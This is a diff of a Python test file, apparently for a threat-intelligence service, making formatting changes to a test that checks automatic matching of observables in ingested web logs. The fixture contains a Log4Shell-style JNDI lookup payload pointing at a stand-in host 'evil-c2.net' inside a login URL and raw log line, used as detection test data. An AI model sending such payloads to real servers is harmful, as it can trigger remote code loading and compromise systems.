@@ -6,6 +6,7 @@ observable inventories, audit logging, and automatic ingestion observable correl
 """
 
 from unittest.mock import patch
+
 import pytest
 from fastapi.testclient import TestClient
 
@@ -133,7 +134,7 @@ def test_tiore_automatic_ingestion_observable_matching(api_client, auth_headers)
             "method": "GET",
             "endpoint": "/login?token=${jndi:ldap://evil-c2.net:1389/Exploit}",
             "status_code": 200,
-            "raw_log": "45.155.205.233 - - [21/Nov/2026:12:00:00 +0000] \"GET /login?token=${jndi:ldap://evil-c2.net:1389/Exploit} HTTP/1.1\" 200 1234",
+            "raw_log": '45.155.205.233 - - [21/Nov/2026:12:00:00 +0000] "GET /login?token=${jndi:ldap://evil-c2.net:1389/Exploit} HTTP/1.1" 200 1234',
             "tenant_id": "tenant-tiore",
         }
     }
